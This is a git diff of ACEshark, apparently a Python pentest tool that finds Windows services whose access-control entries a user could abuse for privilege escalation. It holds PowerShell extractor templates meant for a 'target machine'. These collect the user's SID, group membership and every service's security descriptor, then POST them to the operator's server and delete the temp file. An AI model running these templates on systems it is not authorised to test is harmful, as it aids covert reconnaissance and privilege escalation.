@@ -10,6 +10,7 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 from threading import Thread
 from ipaddress import ip_address
 from time import sleep
+from pyperclip import copy as copy2cb
 
 ''' Colors '''
 MAIN = '\033[38;5;50m'
@@ -29,6 +30,7 @@ INFO = f'[{MAIN}Info{RST}]'
 ERR = f'[{RED}Error{RST}]'
 DEBUG = f'[{ORNG}Debug{RST}]'
 OOPS = f'[{RED}Oops!{RST}]'
+IMP = f'[{ORNG}Important{RST}]'
 
 
 def do_nothing():
@@ -47,195 +49,196 @@ parser = argparse.ArgumentParser(
 	description="ACEshark is a utility designed for rapid extraction and analysis of Windows service configurations and Access Control Entries, eliminating the need for tools like accesschk.exe or other non-native binaries."
 )
 basic_group = parser.add_argument_group('BASIC OPTIONS')
-basic_group.add_argument("-s", "--server-address", action="store", help = "Your server IP or domain name. Cannot be used with -f.", type = str)
-basic_group.add_argument("-p", "--port", action="store", help="Http / Https server port (default: 80 / 443).", type=valid_port, default=None)
+basic_group.add_argument("-s", "--server-address", action="store", help = "Your server IP or domain name. This option cannot be used with -f.", type = str)
+basic_group.add_argument("-p", "--port", action="store", help="HTTP / HTTPS server port (default: 80 / 443).", type=valid_port, default=None)
 basic_group.add_argument("-c", "--certfile", action="store", help="Optional: Path to the TLS certificate for enabling HTTPS.")
 basic_group.add_argument("-k", "--keyfile", action="store", help="Optional: Path to the private key for the TLS certificate.")
-basic_group.add_argument("-f", "--file-input", action="store", help = "ACEshark creates log files every time you run the extractor script on a machine (stored in ~/.AC Eshark). Use this option to regenerate a services config analysis from a log file. Cannot be used with -s.", type = str)
+basic_group.add_argument("-f", "--file-input", action="store", help = "ACEshark creates log files every time you run the extractor script on a machine (stored in ~/.ACEshark). Use this option to regenerate a services config analysis from a log file. This option cannot be used with -s.", type = str)
 
 modes_group = parser.add_argument_group('MODES')
-modes_group.add_argument("-i", "--interesting-only", action="store_true", help = "Only list services and ACEs that your user may be able to abuse based on his SID and group membership (user has at least (WRITE_PROPERTY AND CONTROL_ACCESS) OR GENERIC_ALL privileges).")
-modes_group.add_argument("-g", "--great-candidates", action="store_true", help = "Similar to --interesting-only but with stricter criteria. A service is labeled as a great candidate for privilege escalation if the service's START_TYPE == DEMAND_START AND TYPE == WIN32_OWN_PROCESS AND your user has ((WRITE_PROPERTY AND CONTROL_ACCESS) OR GENERIC_ALL privileges).")
-modes_group.add_argument("-a", "--audit", action="store_true", help = "Audit mode. Analyzes all service ACEs without searching for user-specific abusable services (Long output). This option also downgrades the extractor script, omitting the retrieval of the current user's SID and group membership information.")
-modes_group.add_argument("-x", "--custom-mode", action="store", help = "Similar to --interesting-only but with specified criteria. Provide a comma-separated list of integers for generic access rights to match. Use -lg to list all predefined generic access rights.", type = str)
+modes_group.add_argument("-i", "--interesting-only", action="store_true", help = "List only service ACEs potentially abusable by your user, based on their SID and group membership, with at least (WRITE_PROPERTY AND CONTROL_ACCESS) or GENERIC_ALL privileges.")
+modes_group.add_argument("-g", "--great-candidates", action="store_true", help = "Similar to --interesting-only but with stricter criteria. A service is labeled as a great candidate for privilege escalation if the service's START_TYPE == DEMAND_START AND TYPE == WIN32_OWN_PROCESS AND your user has (WRITE_PROPERTY AND CONTROL_ACCESS) OR GENERIC_ALL privileges.")
+modes_group.add_argument("-a", "--audit", action="store_true", help = "Audit mode. Analyzes all service ACEs without searching for user-specific abusable services (Long output). This option also downgrades the extractor script, omitting the retrieval of the current user's SID and group membership information. By default, the WRITE_PROPERTY and CONTROL_ACCESS rights are highlighted for simplicity when they are present. ")
+modes_group.add_argument("-x", "--custom-mode", action="store", help = "Provide a comma-separated list of integers representing generic access rights to match. List only service ACEs that your user may be able to abuse based on their SID and group membership. Use -lg to list all predefined generic access rights.", type = str)
 modes_group.add_argument("-lg", "--list-generic", action="store_true", help = "List all predefined generic access rights.")
 
 extractor_group = parser.add_argument_group('EXTRACTOR MODIFICATIONS')
 extractor_group.add_argument("-gs", "--get-service", action="store_true", help = "This option modifies the extractor script to use Get-Service for listing available services. While cleaner, it may not work with a low-privileged account. The default Get-ChildItem approach, though less elegant, is more likely to succeed in most cases.")
-extractor_group.add_argument("-e", "--encode", action="store_true", help = "Generate base64 encoded services configuration extractor script instead of raw PowerShell.")
+extractor_group.add_argument("-e", "--encode", action="store_true", help = "Generate Base64-encoded services configuration extractor script instead of raw PowerShell.")
 extractor_group.add_argument("-z", "--config-filename", action="store", default="sc.txt", help = "Change the temporary filename used to store the extracted services configuration before transferring the data via HTTP (default: sc.txt).", type = str)
 extractor_group.add_argument("-d", "--delimiter", action="store", default="#~", help = "Change the delimiter value used for service config serialization (default: #~). Use this option cautiously. It is rarely needed.", type = str)
 
 output_group = parser.add_argument_group('OUTPUT')
 output_group.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
-output_group.add_argument("-v", "--verbose", action="store_true", help = "Print the user's SID and group membership info as well (not applicable in audit mode).")
+output_group.add_argument("-v", "--verbose", action="store_true", help = "Print the user's SID and group membership info as well (not applicable in Audit mode).")
 
 args = parser.parse_args()
 
-# Config source control
-if not args.server_address and not args.file_input:
-	exit(f'\n{DEBUG} You must specify either -s, --server-address or -f, --file input.')
-elif args.server_address and args.file_input:
-	exit(f'\n{DEBUG} Only one option can be used: -s, --server-address or -f, --file input')
+if not args.list_generic:
 
-# Mode selection control
-custom_mode = True if args.custom_mode else False
-if (args.interesting_only + args.audit + args.great_candidates + custom_mode) > 1:
-	exit(f'\n{DEBUG} A single mode can be used at a time:\n   -i, --interesting-only\n   -g, --great-candidates-only\n   -a, --audit\n   -x, --custom-mode')
+	# Services config source control
+	if not args.server_address and not args.file_input:
+		exit(f'\n{DEBUG} You must specify either -s, --server-address or -f, --file input.')
+	elif args.server_address and args.file_input:
+		exit(f'\n{DEBUG} Only one option can be used: -s, --server-address or -f, --file input')
 
-if (args.interesting_only + args.audit + args.great_candidates + custom_mode) == 0:
-	exit(f'\n{DEBUG} Select a mode:\n   -i, --interesting-only\n   -g, --great-candidates-only\n   -a, --audit\n   -x, --custom-mode')
+	# Mode selection control
+	custom_mode = True if args.custom_mode else False
+	if (args.interesting_only + args.audit + args.great_candidates + custom_mode) > 1:
+		exit(f'\n{DEBUG} A single mode can be used at a time:\n   -i, --interesting-only\n   -g, --great-candidates\n   -a, --audit\n   -x, --custom-mode')
+	elif (args.interesting_only + args.audit + args.great_candidates + custom_mode) == 0:
+		exit(f'\n{DEBUG} Select a mode:\n   -i, --interesting-only\n   -g, --great-candidates\n   -a, --audit\n   -x, --custom-mode')
 
-mode = 'audit' if args.audit else 'pe'
-
-
-# Check if both cert and key files were provided
-tls = False
-if (args.certfile and not args.keyfile) or (args.keyfile and not args.certfile):
-	exit(f'{DEBUG} TLS support seems to be misconfigured (missing key or cert file).')
-elif args.certfile and args.keyfile:
-	tls = True
+	mode = 'audit' if args.audit else 'pe'
 
 
-def validate_host_address(addr):
+	# Check if both cert and key files were provided
+	tls = False
+	if (args.certfile and not args.keyfile) or (args.keyfile and not args.certfile):
+		exit(f'{DEBUG} TLS support seems to be misconfigured (missing key or cert file).')
+	elif args.certfile and args.keyfile:
+		tls = True
 
-	addr_verified = False
-	try:
-		# Check if valid IP address
-		addr_verified = str(ip_address(addr))
 
-	except ValueError:
+	def validate_host_address(addr):
 
-		# Check if valid hostname
-		if len(addr) > 255:
-			addr_verified = False
-			print(f'{DEBUG} Hostname length greater than 255 characters.')
-			return False
-		
-		if addr[-1] == ".":
-			addr = addr[:-1]  # Strip trailing dot (used to indicate an absolute domain name and technically valid according to DNS standards)
+		addr_verified = False
+		try:
+			# Check if valid IP address
+			addr_verified = str(ip_address(addr))
 
-		disallowed = re.compile(r"[^A-Z\d-]", re.IGNORECASE)
-		if all(len(part) and not part.startswith("-") and not part.endswith("-") and not disallowed.search(part) for part in addr.split(".")):
-			# Check if hostname is resolvable
-			try:
-				socket.gethostbyname(addr)
-				addr_verified = addr
-			except:
-				pass			
+		except ValueError:
+
+			# Check if valid hostname
+			if len(addr) > 255:
+				addr_verified = False
+				print(f'{DEBUG} Hostname length greater than 255 characters.')
+				return False
 			
-	return addr_verified
+			if addr[-1] == ".":
+				addr = addr[:-1]  # Strip trailing dot (used to indicate an absolute domain name and technically valid according to DNS standards)
+
+			disallowed = re.compile(r"[^A-Z\d-]", re.IGNORECASE)
+			if all(len(part) and not part.startswith("-") and not part.endswith("-") and not disallowed.search(part) for part in addr.split(".")):
+				# Check if hostname is resolvable
+				try:
+					socket.gethostbyname(addr)
+					addr_verified = addr
+				except:
+					pass			
+				
+		return addr_verified
 
 
-if not args.file_input:
-	valid_addr = validate_host_address(args.server_address)
-	exit(f'{DEBUG} Server address is not resolvable. Check input and try again.') if not valid_addr else do_nothing()
+	if not args.file_input:
+		valid_addr = validate_host_address(args.server_address)
+		exit(f'{DEBUG} Server address is not resolvable. Check input and try again.') if not valid_addr else do_nothing()
 
 
-# Global
-DEBUG_ENDPOINT = '_debug_'
-POST_DATA_ENDPOINT = 'ACEshark'
-SRVS_CONF_FILENAME = args.config_filename
-DELIMITER = args.delimiter
-# user_sid = ''
-# user_groups = ''
-server_address = args.server_address
-port = args.port if args.port else (443 if tls else 80)
-ACEshark_logs_dir = os.path.join(os.path.expanduser("~"), ".ACEshark")
-FIN = False
+	# Global
+	DEBUG_ENDPOINT = '_debug_'
+	POST_DATA_ENDPOINT = 'ACEshark'
+	SRVS_CONF_FILENAME = args.config_filename
+	DELIMITER = args.delimiter
+	# user_sid = ''
+	# user_groups = ''
+	server_address = args.server_address
+	port = args.port if args.port else (443 if tls else 80)
+	ACEshark_logs_dir = os.path.join(os.path.expanduser("~"), ".ACEshark")
+	FIN = False
 
-# Extractor Script Templates
-# Using Get-ChildItem to list services (default - More likely to work with a low-privileged account).
-GC_audit_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, "{SRVS_CONF_FILENAME}"); Set-Content -Path $f -Value ""; Get-ChildItem -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services" | % {{ $c=sc.exe sdshow $_.PSChildName; $x=(sc.exe qc $_.PSChildName | ForEach-Object {{ $_.Trim() }}) -join "{DELIMITER}";Add-Content -Path $f -Value "$($_.PSChildName)::$x`n$c" }}; $d=Get-Content -Path $f -Raw; IRM -Uri "{"http" if not tls else "https"}://{server_address}:{port}/{POST_DATA_ENDPOINT}" -Method POST -Body @{{data=$d}}; del $f'
+	# Extractor Script Templates
+	# Using Get-ChildItem to list services (default - More likely to work with a low-privileged account).
+	GC_audit_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, "{SRVS_CONF_FILENAME}"); Set-Content -Path $f -Value ""; Get-ChildItem -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services" | % {{ $c=sc.exe sdshow $_.PSChildName; $x=(sc.exe qc $_.PSChildName | ForEach-Object {{ $_.Trim() }}) -join "{DELIMITER}";Add-Content -Path $f -Value "$($_.PSChildName)::$x`n$c" }}; $d=Get-Content -Path $f -Raw; IRM -Uri "{"http" if not tls else "https"}://{server_address}:{port}/{POST_DATA_ENDPOINT}" -Method POST -Body @{{data=$d}}; del $f'
 
-GC_pe_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, "{SRVS_CONF_FILENAME}"); Set-Content -Path $f -Value ""; Add-Content -Path $f -Value (([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value)); Add-Content -Path $f -Value ((whoami /groups) + "</groups>"); Get-ChildItem -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services" | % {{ $c=sc.exe sdshow $_.PSChildName; $x=(sc.exe qc $_.PSChildName | ForEach-Object {{ $_.Trim() }}) -join "{DELIMITER}"; Add-Content -Path $f -Value "$($_.PSChildName)::$x`n$c" }}; $d=Get-Content -Path $f -Raw; IRM -Uri "{"http" if not tls else "https"}://{server_address}:{port}/{POST_DATA_ENDPOINT}" -Method POST -Body @{{data=$d}}; del $f'
+	GC_pe_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, "{SRVS_CONF_FILENAME}"); Set-Content -Path $f -Value ""; Add-Content -Path $f -Value (([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value)); Add-Content -Path $f -Value ((whoami /groups) + "</groups>"); Get-ChildItem -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services" | % {{ $c=sc.exe sdshow $_.PSChildName; $x=(sc.exe qc $_.PSChildName | ForEach-Object {{ $_.Trim() }}) -join "{DELIMITER}"; Add-Content -Path $f -Value "$($_.PSChildName)::$x`n$c" }}; $d=Get-Content -Path $f -Raw; IRM -Uri "{"http" if not tls else "https"}://{server_address}:{port}/{POST_DATA_ENDPOINT}" -Method POST -Body @{{data=$d}}; del $f'
 
-# Using Get-Service to list services (Cleaner, but won't work with a low-privileged account).
-GS_audit_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, "{SRVS_CONF_FILENAME}"); Set-Content -Path $f -Value ""; Get-Service | % {{ $c=sc.exe sdshow $_.Name; $x=(sc.exe qc $_.Name | ForEach-Object {{ $_.Trim() }}) -join "{DELIMITER}";Add-Content -Path $f -Value "$($_.Name)::$x`n$c" }}; $d=Get-Content -Path $f -Raw; IRM -Uri "{"http" if not tls else "https"}://{server_address}:{port}/{POST_DATA_ENDPOINT}" -Method POST -Body @{{data=$d}}; del $f'
+	# Using Get-Service to list services (Cleaner, but won't work with a low-privileged account).
+	GS_audit_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, "{SRVS_CONF_FILENAME}"); Set-Content -Path $f -Value ""; Get-Service | % {{ $c=sc.exe sdshow $_.Name; $x=(sc.exe qc $_.Name | ForEach-Object {{ $_.Trim() }}) -join "{DELIMITER}";Add-Content -Path $f -Value "$($_.Name)::$x`n$c" }}; $d=Get-Content -Path $f -Raw; IRM -Uri "{"http" if not tls else "https"}://{server_address}:{port}/{POST_DATA_ENDPOINT}" -Method POST -Body @{{data=$d}}; del $f'
 
-GS_pe_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, "{SRVS_CONF_FILENAME}"); Set-Content -Path $f -Value ""; Add-Content -Path $f -Value (([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value)); Add-Content -Path $f -Value ((whoami /groups) + "</groups>"); Get-Service | % {{ $c=sc.exe sdshow $_.Name; $x=(sc.exe qc $_.Name | ForEach-Object {{ $_.Trim() }}) -join "{DELIMITER}"; Add-Content -Path $f -Value "$($_.Name)::$x`n$c" }}; $d=Get-Content -Path $f -Raw; IRM -Uri "{"http" if not tls else "https"}://{server_address}:{port}/{POST_DATA_ENDPOINT}" -Method POST -Body @{{data=$d}}; del $f'
+	GS_pe_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, "{SRVS_CONF_FILENAME}"); Set-Content -Path $f -Value ""; Add-Content -Path $f -Value (([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value)); Add-Content -Path $f -Value ((whoami /groups) + "</groups>"); Get-Service | % {{ $c=sc.exe sdshow $_.Name; $x=(sc.exe qc $_.Name | ForEach-Object {{ $_.Trim() }}) -join "{DELIMITER}"; Add-Content -Path $f -Value "$($_.Name)::$x`n$c" }}; $d=Get-Content -Path $f -Raw; IRM -Uri "{"http" if not tls else "https"}://{server_address}:{port}/{POST_DATA_ENDPOINT}" -Method POST -Body @{{data=$d}}; del $f'
 
-active_template = (GC_audit_template if mode == 'audit' else GC_pe_template) if not args.get_service else (GS_audit_template if mode == 'audit' else GS_pe_template)
-
-
-# ACE object types
-well_known_sids = {
-	"AU": "Authenticated Users",
-	"BA": "Built-in Administrators",
-	"BG": "Built-in Guests",
-	"BO": "Backup Operators",
-	"BU": "Built-in Users",
-	"CA": "Certificate Server Administrators",
-	"CG": "Creator Group",
-	"CO": "Creator Owner",
-	"DA": "Domain Administrators",
-	"DC": "Domain Computers",
-	"DD": "Domain Controllers",
-	"DG": "Domain Guests",
-	"DU": "Domain Users",
-	"EA": "Enterprise Administrators",
-	"ED": "Enterprise Domain Controllers",
-	"IU": "Interactive Users",
-	"LA": "Local Administrator",
-	"LG": "Local Guest",
-	"LS": "Local Service",
-	"LU": "Network Logon User",
-	"MO": "Creator Owner Server",
-	"MU": "Creator Group Server",
-	"NO": "Network Configuration Operators",
-	"NS": "Network Service",
-	"NU": "Network",
-	"OW": "Owner Rights",
-	"PS": "Personal Self",
-	"PU": "Power Users",
-	"RC": "Restricted Code",
-	"RE": "Restricted Network",
-	"RO": "Replica Server Operators",
-	"RU": "Alias to allow previous Windows 2000",
-	"SA": "Schema Administrators",
-	"SI": "System",
-	"SO": "Server Operators",
-	"SU": "Service Logon User",
-	"WD": "Everyone",
-	"WG": "Windows Authorization Access Group",
-	"WO": "Well-known group object",
-	"WR": "World Access Group",
-	"YS": "Terminal Server Users",
-	"VA": "Virtual Account",
-	"UI": "NTLM Authentication",
-	# Standard accounts
-	"SY": "Local System",
-	"LS": "Local Service",
-	"NS": "Network Service",
-	"BA": "Built-in Administrators",
-	"BU": "Built-in Users",
-	"BG": "Built-in Guests",
-	"PU": "Power Users",
-	"AO": "Account Operators",
-	"SO": "Server Operators",
-	"PO": "Print Operators",
-	"BO": "Backup Operators",
-	"RE": "Replicator"
-}
+	active_template = (GC_audit_template if mode == 'audit' else GC_pe_template) if not args.get_service else (GS_audit_template if mode == 'audit' else GS_pe_template)
 
 
-ace_types = {	
-	0: "ACCESS_ALLOWED",
-	1: "ACCESS_DENIED",
-	5: "ACCESS_ALLOWED_OBJECT",
-	6: "ACCESS_DENIED_OBJECT",
-	7: "SYSTEM_AUDIT_OBJECT",
-	8: "SYSTEM_ALARM_OBJECT",
-	9: "ACCESS_ALLOWED_CALLBACK",
-	10: "ACCESS_DENIED_CALLBACK",
-	11: "ACCESS_ALLOWED_CALLBACK_OBJECT",
-	13: "SYSTEM_AUDIT_CALLBACK",
-	17: "SYSTEM_MANDATORY_LABEL",
-	18: "SYSTEM_RESOURCE_ATTRIBUTE",
-	19: "SYSTEM_SCOPED_POLICY_ID",
-	20: "SYSTEM_PROCESS_TRUST_LABEL",
-	21: "SYSTEM_ACCESS_FILTER"
-}
+	# ACE object types
+	well_known_sids = {
+		"AU": "Authenticated Users",
+		"BA": "Built-in Administrators",
+		"BG": "Built-in Guests",
+		"BO": "Backup Operators",
+		"BU": "Built-in Users",
+		"CA": "Certificate Server Administrators",
+		"CG": "Creator Group",
+		"CO": "Creator Owner",
+		"DA": "Domain Administrators",
+		"DC": "Domain Computers",
+		"DD": "Domain Controllers",
+		"DG": "Domain Guests",
+		"DU": "Domain Users",
+		"EA": "Enterprise Administrators",
+		"ED": "Enterprise Domain Controllers",
+		"IU": "Interactive Users",
+		"LA": "Local Administrator",
+		"LG": "Local Guest",
+		"LS": "Local Service",
+		"LU": "Network Logon User",
+		"MO": "Creator Owner Server",
+		"MU": "Creator Group Server",
+		"NO": "Network Configuration Operators",
+		"NS": "Network Service",
+		"NU": "Network",
+		"OW": "Owner Rights",
+		"PS": "Personal Self",
+		"PU": "Power Users",
+		"RC": "Restricted Code",
+		"RE": "Restricted Network",
+		"RO": "Replica Server Operators",
+		"RU": "Alias to allow previous Windows 2000",
+		"SA": "Schema Administrators",
+		"SI": "System",
+		"SO": "Server Operators",
+		"SU": "Service Logon User",
+		"WD": "Everyone",
+		"WG": "Windows Authorization Access Group",
+		"WO": "Well-known group object",
+		"WR": "World Access Group",
+		"YS": "Terminal Server Users",
+		"VA": "Virtual Account",
+		"UI": "NTLM Authentication",
+		# Standard accounts
+		"SY": "Local System",
+		"LS": "Local Service",
+		"NS": "Network Service",
+		"BA": "Built-in Administrators",
+		"BU": "Built-in Users",
+		"BG": "Built-in Guests",
+		"PU": "Power Users",
+		"AO": "Account Operators",
+		"SO": "Server Operators",
+		"PO": "Print Operators",
+		"BO": "Backup Operators",
+		"RE": "Replicator"
+	}
+
+
+	ace_types = {	
+		0: "ACCESS_ALLOWED",
+		1: "ACCESS_DENIED",
+		5: "ACCESS_ALLOWED_OBJECT",
+		6: "ACCESS_DENIED_OBJECT",
+		7: "SYSTEM_AUDIT_OBJECT",
+		8: "SYSTEM_ALARM_OBJECT",
+		9: "ACCESS_ALLOWED_CALLBACK",
+		10: "ACCESS_DENIED_CALLBACK",
+		11: "ACCESS_ALLOWED_CALLBACK_OBJECT",
+		13: "SYSTEM_AUDIT_CALLBACK",
+		17: "SYSTEM_MANDATORY_LABEL",
+		18: "SYSTEM_RESOURCE_ATTRIBUTE",
+		19: "SYSTEM_SCOPED_POLICY_ID",
+		20: "SYSTEM_PROCESS_TRUST_LABEL",
+		21: "SYSTEM_ACCESS_FILTER"
+	}
 
 
 generic_access_rights = {
@@ -273,13 +276,15 @@ if args.custom_mode:
 	try:
 		custom_rights = args.custom_mode.split(',')
 		custom_rights = [r.strip() for r in custom_rights if r.strip()]
+		if not custom_rights:
+			raise
 		for r in custom_rights:
 			i = int(r)
 			if i not in generic_access_rights.keys():
-				exit(f'{DEBUG} Int value {i} not in predefined generic access rights.')
+				exit(f'{DEBUG} Int value {i} not in predefined generic access rights. Feel free to submit a pull request if you believe something is missing.')
 				continue
 			target_generic_rights.append(i)
-	except:
+	except Exception as e:
 		exit(f'{DEBUG} Invalid generic access rights value. Please check your input and try again.')
 
 
@@ -302,6 +307,8 @@ def extract_config(c_str):
 					val = line.split(":", 1)[1]
 					val = val.replace('+', ' ').strip()
 					val = re.sub(r'\s+', ' ', val)
+					if c in ['TYPE', 'START_TYPE']:
+						val = val.split(' ', 1)[1]
 				except KeyError:
 					val = ''
 				val = 'UNDISCLOSED' if not val.strip() else val
@@ -329,7 +336,6 @@ def extract_object_name(sid, user_groups):
 def write_to_timestamped_file(content):
 	timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
 	file_name = f"{timestamp}.ACEshark.log"
-	cwd = os.getcwd()
 	file_path = os.path.join(ACEshark_logs_dir, file_name)
 	
 	with open(file_path, 'w') as file:
@@ -370,6 +376,7 @@ def encodeExtractor(payload):
 	return enc_payload
 
 
+
 def extractGroups(url_decoded_data_l):
 	user_groups = []
 	c = 0
@@ -385,6 +392,7 @@ def extractGroups(url_decoded_data_l):
 
 def audit_services_config(url_decoded_data_l):
 	global FIN, target_generic_rights
+	print(f'{INFO} Initiating services audit.')
 
 	if not args.audit:
 		user_sid = url_decoded_data_l.pop(0)
@@ -414,7 +422,7 @@ def audit_services_config(url_decoded_data_l):
 		aces_list = re.findall('\\([0-9A-Za-z;\\-]*\\)', aces)
 
 		# Initialize the ACE parser
-		print(f'{BOLD}[{ORNG}{service}{RST}][{service_type}][{start_type}] Running as user: {BOLD}{user_account}{RST}')
+		print(f'{BOLD}[{LPURPLE}{service}{RST}][{service_type}][{start_type}] Running as user: {BOLD}{user_account}{RST}')
 		
 		for item in aces_list:
 			member = False
@@ -447,42 +455,44 @@ def audit_services_config(url_decoded_data_l):
 				legit_sid = sid_val.startswith('S')
 				sid = ace_target if legit_sid and ace_target else sid
 				obj_name = extract_object_name(sid, user_groups) if not wellknown and legit_sid else ''
+				great_candidate = False
+				c = 0
 				
 				# Check if user has any rights on the service
 				if args.audit or (re.search(f'{sid_val} ', user_groups) or sid_val.upper() == user_sid.upper().strip()):
 					member = True
 					rights_detailed = extract_rights(ace) # -> STR LIST rights, BOOL full_control, INT LIST rights
-					display_rights = 'None' if not rights_detailed[0] else '\n                    '.join(rights_detailed[0])								
-					great_candidate = True if rights_detailed[1] or (service_type == '10 WIN32_OWN_PROCESS' and start_type == '3 DEMAND_START') else False
+					display_rights = 'None' if not rights_detailed[0] else '\n                  '.join(rights_detailed[0])								
+					great_candidate = True if rights_detailed[1] or (service_type == 'WIN32_OWN_PROCESS' and start_type == 'DEMAND_START') else False
 					interesting_or_abusable = True
 					if not rights_detailed[0]:
 						interesting_or_abusable = False
 					else:
-						if not args.custom_mode:
-							for i in [32, 256]:
-								if i not in rights_detailed[2]:
-									interesting_or_abusable = False
-									break
+						target_gen_access_rights = [32, 256] if not args.custom_mode else target_generic_rights
+						for i in target_gen_access_rights:
+							if i not in rights_detailed[2]:
+								interesting_or_abusable = False
+								break
 
-					great_candidate = True if (member and interesting_or_abusable and not args.custom_mode and service_type == '10 WIN32_OWN_PROCESS' and start_type == '3 DEMAND_START') else False
+					great_candidate = True if (member and interesting_or_abusable and not args.custom_mode and service_type == 'WIN32_OWN_PROCESS' and start_type == 'DEMAND_START') else False
 
 				if args.audit or (((member and interesting_or_abusable and (args.interesting_only or args.custom_mode)) or (args.great_candidates and great_candidate))):
-					
-					print(f'        [{PL}] Parsing {item}')
-					print(f'            ACE Type: {BOLD}{ace_type}{RST}')							
+					print() if c == 0 else do_nothing()
+					print(f'      [{PL}] Analyzing ACE {item}')
+					print(f'          ACE Type: {BOLD}{ace_type}{RST}')							
 					if obj_name:
-						print(f'            SID / Group: {BOLD}{BLUE}{obj_name}{RST} ({sid_val})')
+						print(f'          User / Group: {BOLD}{BLUE}{obj_name}{RST} ({sid_val})')
 					else:
-						print(f'            SID / Group: {BOLD}{sid}{RST}' if sid_val == sid else f'            SID / Group: {BOLD}{sid}{RST} ({sid_val})')
-					print(f'            Rights: {display_rights}')
-					print(f'            Binary Path: {binpath}')
+						print(f'          User / Group: {BOLD}{sid}{RST}' if sid_val == sid else f'          User / Group: {BOLD}{sid}{RST} ({sid_val})')
+					print(f'          Rights: {display_rights}')
+					print(f'          Binary Path: {binpath}')
 
 					if not args.audit and not args.custom_mode:
-						print(f'            {ORNG}Potentially Abusable{" - Great Candidate" if great_candidate else ""}!{RST}') if interesting_or_abusable else do_nothing()
+						print(f'          {ORNG}Potentially Abusable{" - Great Candidate" if great_candidate else ""}!{RST}') if interesting_or_abusable else do_nothing()
 						if user_account.strip() in ['LocalSystem', 'NT+AUTHORITY\\System', 'NT AUTHORITY\\System']:
-							print(f'            {RED}Running as SYSTEM{RST}') if interesting_or_abusable else do_nothing()
+							print(f'          {RED}Running as SYSTEM{RST}') if interesting_or_abusable else do_nothing()
 					print()
-
+				c += 1
 			except Exception as e:
 				print(f'{ERR} {e}')
 				continue
@@ -492,9 +502,10 @@ def audit_services_config(url_decoded_data_l):
 			if not args.audit:
 				url_decoded_data_l.insert(0, user_sid)
 			url_decoded_data_l.insert(0, 'audit' if args.audit else 'pe')
+			url_decoded_data_l.insert(0, '#!ACEshark_log')
 			write_to_timestamped_file('\n'.join(url_decoded_data_l))
 		except Exception as e:
-			print(f'{ERR} Failed to write configurations to a file: {e} - Moving on.')
+			print(f'{ERR} Failed to write services configuration to a file: {e} - Moving on.')
 		FIN = True
 
 
@@ -550,6 +561,10 @@ def read_file_to_list(file_path):
 	try:
 		with open(file_path, 'r') as file:
 			content = file.read().splitlines()
+			signature = content.pop(0).strip()
+			if signature != '#!ACEshark_log':
+				print(f'{DEBUG} This doesn\'t appear to be an ACEshark log file.')
+				return []
 			mode = content.pop(0).strip()
 			return [mode, content]
 	except FileNotFoundError:
@@ -582,22 +597,24 @@ def create_ACEshark_log_folder():
 
 
 def main():
-	# global server_address, port, mode
+	global active_template
 	create_ACEshark_log_folder()
 	print_banner() if not args.quiet else do_nothing()
 
 	if args.file_input:
-		# I'm bored to handle every args group. Only basic. take it or leave it.
+		extractor_args = [action.dest for action in extractor_group._group_actions]
+		for val in extractor_args:
+			print(f'{INFO} Ignoring argument --{val}.')
 		for key, val in {'--port': args.port, '--certfile': args.certfile, '--keyfile': args.keyfile}.items():
 			print(f'{INFO} Ignoring argument {key}.') if val else do_nothing()
 
 		log = read_file_to_list(args.file_input)
-		exit() if not log else do_nothing()		
+		exit() if not log else do_nothing()
 		log_mode = log[0]
 		data = log[1]
 
 		if (mode == 'pe' and log_mode == 'audit'):
-			exit(f'{DEBUG} This log was generated in audit mode and cannot be used to regenerate the service analysis in -i (--interesting-only) or -g (--great-candidates) modes. FYI, the opposite is possible.')
+			exit(f'{DEBUG} This log was generated in Audit mode and cannot be used to regenerate service analysis in -i (--interesting-only), -x (--custom-mode), or -g (--great-candidates) modes. FYI, the opposite is possible.')
 
 		elif mode == 'pe' and (mode == log_mode):
 			audit_services_config(data)
@@ -630,8 +647,16 @@ def main():
 
 	Thread(target = httpd.serve_forever, args = (), daemon=True).start()
 	print(f'{INFO} Http server started. Try {ORNG}{"http" if not tls else "https"}://{args.server_address}:{port}/{DEBUG_ENDPOINT}{RST} if you wish to check if reachable.')
+	print(f'{IMP} If your TLS certificate is untrusted, you\'ll have to bypass certificate validation for this to work.') if tls else do_nothing()
 	print(f'{INFO} Run the following extractor script (or similar) on the target machine to retrieve the configuration of all services:')
-	print(f'{GREEN}{active_template}{RST}') if not args.encode else print(f'{GREEN}{encodeExtractor(active_template)}{RST}')
+	active_template = encodeExtractor(active_template) if args.encode else active_template
+	print(f'{GREEN}{active_template}{RST}') 
+	try:
+		copy2cb(active_template)
+		print(f'{ORNG}Copied to clipboard!{RST}')
+	except:
+		print(f'{RED}Copy to clipboard failed. Please do it manually.{RST}')
+
 	print(f'\n{INFO} Waiting for script execution on the target, be patient...')
 
 	while not FIN:
